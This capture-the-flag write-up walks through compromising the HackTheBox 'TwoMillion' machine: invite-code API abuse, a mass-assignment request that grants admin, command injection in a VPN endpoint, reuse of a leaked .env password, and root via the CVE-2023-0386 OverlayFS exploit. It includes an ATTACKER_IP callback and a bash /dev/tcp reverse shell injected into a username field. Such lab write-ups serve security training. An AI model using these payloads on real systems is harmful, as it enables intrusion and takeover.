# TwoMillion — HackTheBox Writeup

**Target:** TwoMillion  
**Platform:** HackTheBox  
**Difficulty:** Easy  
**Category:** Web Enumeration, Invite Code Generation, API Documentation Exposure, Mass Assignment, Command Injection, Credential Reuse, Linux Kernel Exploit (OverlayFS)

---

## Recon

As usual, the first step is a port scan with Nmap to map the available attack surface.

```bash
sudo nmap -sC -sV -o nmap -v TARGET_IP
```

![nmap](images/nmap.png)

The scan shows that the web service on port 80 redirects every request to the hostname `2million.htb`. This indicates the application runs as a virtual host: without that hostname resolving to the target IP, requests only land on the default nginx page. The following entry is therefore added to `/etc/hosts` before the application is opened.

```text
TARGET_IP 2million.htb
```

![web](images/web.png)

The page that appears is a replica of the Hack The Box site, complete with "machines online" statistics and a top teams list. This clone has no real function — the entire application logic sits behind API endpoints, so enumeration is directed there rather than at the front page.


---

## Web Enumeration

Directory enumeration is run with gobuster in the background, at the same time as manual inspection of the pages so that no time is wasted waiting for the wordlist to finish. Gobuster immediately finds several important endpoints: `/invite`, `/login`, `/register`, and `/api`.

![gobuster](images/gobuster.png)

The registration page is opened first.

![register](images/register.png)

The registration form turns out not to be freely usable: it has a mandatory invite code field. So the next step is not creating an account but finding a way to obtain that invite code, and the `/invite` page is the most sensible place to start looking. The source of that page is inspected, and inside it a JavaScript file is found at `/js/inviteapi.min.js` whose contents are obfuscated with the packer `eval(function(p,a,c,k,e,d){...})` — a common pattern for hiding code from direct reading. After deobfuscation, it contains two functions.

```javascript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```

Two internal endpoints are exposed from here: `/api/v1/invite/verify` to validate a code, and `/api/v1/invite/how/to/generate` to request instructions on how to create one. The second endpoint is called directly from the terminal.

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq .
```

The response contains encrypted data along with the type of encryption used.

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probably check the encryption type in order to decrypt it..."
}
```

The `enctype` field names ROT13 explicitly, so the string in the `data` field can be decoded directly without having to guess the algorithm.

![rot13](images/rot13.png)

The decode result is an instruction to send a POST request to `/api/v1/invite/generate`. That invite code generation endpoint can be called with no authentication at all — there is no session check, so the whole invite mechanism adds no security, only one extra step.

```bash
curl -X POST http://2million.htb/api/v1/invite/generate | jq .
```

The response from this endpoint returns the invite code in base64, so the value has to be decoded with `base64 -d` before it can be used.

![code](images/code.png)

The invite code obtained is entered on the `/invite` page, which automatically redirects to the registration page. Once the account is created, login is performed with those credentials.

![login](images/login.png)


---

## API Enumeration

After login the attack surface grows: API documentation is available directly at `/api/v1` and lists every endpoint, including the administrative ones.

![docs](images/docs.png)

The key point is that this admin endpoint list can be read by a regular user without any obstacle. As a baseline, admin status is checked with the account that was just created.

```http
GET /api/v1/admin/auth HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=<SESSION_ID>
```

```http
HTTP/1.1 200 OK
server: nginx
date: Mon, 19 Oct 2026 11:05:25 GMT
content-type: application/json
transfer-encoding: chunked
connection: keep-alive
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate
pragma: no-cache

{"message":false}
```

That account is not an admin, as expected. Note that the admin-only endpoint still replies with a 200 rather than an authorization error — the denial is only a `false` value in the body, which indicates there is no strict access control separation at that layer. The next target is `PUT /api/v1/admin/settings/update`, the admin endpoint that accepts changes to user data.


---

## Privilege Escalation — Mass Assignment

The update settings endpoint is tested with a simple payload: sending the `is_admin` field directly in the request body, along with fields that the user is actually supposed to be able to change.

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Type: application/json
Cookie: PHPSESSID=<SESSION_ID>

{"email":"lutz@pwn.me","is_admin":1}
```

```http
HTTP/1.1 200 OK
server: nginx
date: Mon, 19 Oct 2026 11:11:59 GMT
content-type: application/json
transfer-encoding: chunked
connection: keep-alive
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate
pragma: no-cache

{"id":13,"username":"lutz","is_admin":1}
```

The backend accepts the `is_admin` field as-is and stores it as part of the user record. This is mass assignment: the request body is bound straight onto the user model with no field whitelist, so internal parameters that should only be editable by an admin are updated from a regular user's side. Verification is done with the same GET request as the baseline, and the value has changed.

![admin](images/admin.png)

The regular account is now an admin, and every admin-only endpoint is usable. From here the remaining attack surface is the VPN endpoint, listed in the API documentation as a configuration generator for a specific user.


---

## Initial Foothold — Command Injection

The `POST /api/v1/admin/vpn/generate` endpoint is tested from two angles. First, input validation: a username that is not registered in the database is still processed — the server does not verify whether that username actually exists, so the VPN output is generated from arbitrary input. Second, special characters: the backend most likely calls `openssl` through `exec()` using a command string that contains the username, so characters such as `;` are not escaped and the additional command is executed by the shell as well. The first test uses a request back to an empty listener to prove that command execution happens server-side.

```bash
curl --json '{"username":"lutz; curl http://ATTACKER_IP/"}' -H "Cookie: PHPSESSID=<SESSION_ID>" http://2million.htb/api/v1/admin/vpn/generate
```

A listener that catches a connection from the target IP shows the injected command is genuinely executed by the server in the web user's context, not merely logged.

![command](images/command.png)

The foothold is taken by turning the payload into a reverse shell to port 9004.

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Content-Type: application/json
Cookie: PHPSESSID=<SESSION_ID>

{"username":"lutz; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9004 0>&1'"}
```

The incoming shell is upgraded to an interactive PTY so it can be used for further enumeration without losing job control.

![shell](images/shell.png)


---

## Lateral Movement — Credential Reuse

Manual enumeration of the web directory immediately finds a `.env` file that holds database credentials in plaintext.

```text
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

The box also has one non-root user with a valid shell, and that database password turns out to be reused as the login password for the `admin` user through `su`.

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```

![su_admin](images/su_admin.png)

This move is purely the result of password reuse: credentials leaked from the application configuration file are reused for system authentication, so no additional flaw is needed to switch user.


---

## Privilege Escalation — OverlayFS (CVE-2023-0386)

Manual enumeration in the `admin` session found no escalation path. linpeas is run as a cross-check to make sure nothing was missed, and its output likewise shows no exploitable vector. The last path left is a kernel exploit.

After research, the flaw used is CVE-2023-0386, a bug in the OverlayFS subsystem during the copy up of a file from a `nosuid` mount into another mount: the UID mapping is incorrect, so a file carrying SUID from that mount can appear in the destination mount owned by root and still execute code as root. On Ubuntu this flaw is fixed in kernel 5.15.0-70.77 (USN-6025-1); because the exploit succeeded on this box, the target kernel is still on a build before that patch.

The exploit used comes from https://github.com/puckiestyle/CVE-2023-0386, and it consists of three interdependent components:

- `fuse.c` — serves the `lower` directory as a fake FUSE filesystem. The `/file` inside it is reported with mode `04777` and UID/GID `0`, and its content is the shell binary compiled from `getshell.c` (read from the path passed as an argument). So the `lower` mount appears to contain a root-owned SUID binary.
- `exp.c` — recreates the mount chain in a new namespace (`unshare` + `uid_map`/`gid_map`), mounts the overlay with `lowerdir`/`upperdir`/`workdir` from `./ovlcap`, then triggers the copy up by creating a file in the `merge` directory. That copy up is what carries the "root-owned" file into `upper`.
- `getshell.c` — the payload executed after the copy up: `setuid(0)`, `setgid(0)`, then `system("/bin/bash")`.

Compilation is done with:

```bash
make all
```

Because `fuse` has to stay alive serving `lower` while `exp` triggers the copy up, this exploit needs two terminal sessions running at the same time. The first session uses the already-open reverse shell, while the second logs in over SSH as user `admin` with the same password as in the `.env` file.

```bash
# terminal 1
./fuse ./ovlcap/lower ./gc

# terminal 2
./exp
```

The exploit repo is packaged into a zip file, transferred to the target through a python http server and downloaded with curl, then extracted in the `admin` user's home directory before being compiled.

Once both processes are running, the session in the second terminal turns into a root shell, and full access to the box is obtained without needing any further misconfiguration.

![root](images/root.png)
